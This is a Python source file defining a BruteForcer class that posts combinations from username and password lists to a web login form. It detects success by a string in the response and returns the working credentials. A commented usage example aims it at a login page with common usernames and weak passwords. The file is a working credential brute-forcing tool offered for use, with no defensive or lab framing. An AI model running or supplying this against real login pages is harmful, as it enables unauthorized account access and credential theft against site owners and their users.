import requests
import logging

logger = logging.getLogger(__name__)

class BruteForcer:
    def __init__(self, target_url, user_field, pass_field, success_indicator, max_attempts=1000):
        """
        target_url: URL with login form
        user_field: form field name for username
        pass_field: form field name for password
        success_indicator: string to detect successful login in response
        max_attempts: max number of login attempts allowed
        """
        self.target_url = target_url
        self.user_field = user_field
        self.pass_field = pass_field
        self.success_indicator = success_indicator
        self.max_attempts = max_attempts

    def run(self, username_list, password_list):
        """
        Run brute force using username and password lists.

        Returns (found: bool, credentials: dict)
        """
        attempt_count = 0
        for username in username_list:
            for password in password_list:
                if attempt_count >= self.max_attempts:
                    logger.info("Reached max attempts limit.")
                    return False, {}

                data = {
                    self.user_field: username,
                    self.pass_field: password
                }

                try:
                    response = requests.post(self.target_url, data=data, timeout=10)
                    if self.success_indicator in response.text:
                        logger.info(f"Success with {username}:{password}")
                        return True, {"username": username, "password": password}
                except Exception as e:
                    logger.error(f"Attempt error {username}:{password}: {e}")

                attempt_count += 1
        logger.info("Brute force completed without success.")
        return False, {}

# # Usage example
# if __name__ == "__main__":
#     brute = BruteForcer(
#         target_url="http://example.com/login",
#         user_field="username",
#         pass_field="password",
#         success_indicator="Welcome"
#     )

#     user_list = ["admin", "root", "user"]
#     pass_list = ["123456", "password", "admin123"]

#     success, creds = brute.run(user_list, pass_list)
#     if success:
#         print(f"Login success: {creds}")
#     else:
#         print("No valid credentials found.")
